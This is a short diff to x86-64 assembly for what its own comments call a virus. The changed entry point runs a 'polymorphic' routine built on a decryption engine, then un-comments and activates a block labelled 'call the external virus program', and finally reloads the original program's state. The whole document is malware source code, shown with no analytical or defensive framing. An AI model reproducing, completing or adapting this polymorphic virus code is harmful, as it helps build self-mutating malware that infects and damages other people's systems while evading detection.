@@ -32,14 +32,6 @@ _start:             ; Global entry point
 	; mov rdi, r14
 	; mov rsi, r15
 
-	; ; call the external virus program
-	; xor rbp, rbp
-	; pop rdi
-	; mov rsi, rsp
-	; lea rdx, [rsp+rdi+8*8]
-	; push rdi
-	; call main
-
 	; reload the initial program, state
 	mov rsp, rbx 
 	mov rdi, r14
@@ -51,6 +43,17 @@ _start:             ; Global entry point
 	sub rsi, main
 	mov rdx, decrypt_engine.decryption_function
 	call polymorphic
+
+	; call the external virus program
+	xor rbp, rbp
+	pop rdi
+	mov rsi, rsp
+	lea rdx, [rsp+rdi+8*8]
+	push rdi
+	call main
+
+
+
 	mov rdi, rax
 	mov eax, 1
 	int 80h
